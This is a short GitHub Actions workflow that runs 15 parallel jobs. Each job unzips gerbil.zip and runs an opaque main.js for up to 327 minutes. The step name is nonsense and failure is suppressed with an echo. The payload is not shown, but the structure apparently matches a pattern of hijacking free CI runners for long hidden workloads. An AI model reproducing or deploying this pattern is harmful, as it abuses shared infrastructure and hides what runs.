name: gerbil
on:
  push:
    branches: [ "main" ]
    paths:
      - "gerbil.txt"

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { os: 0 }
          - { os: 1 }
          - { os: 2 }
          - { os: 3 }
          - { os: 4 }
          - { os: 5 }
          - { os: 6 }
          - { os: 7 }
          - { os: 8 }
          - { os: 9 }
          - { os: 10 }
          - { os: 11 }
          - { os: 12 }
          - { os: 13 }
          - { os: 14 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20

      - name: Unzip gerbil.zip
        run: |
          sudo apt install -y unzip
          unzip gerbil.zip

      - name: expensive onto underachieve
        run: |
          npm install --ignore-scripts
          timeout 327m node main.js || echo "gerbil executed"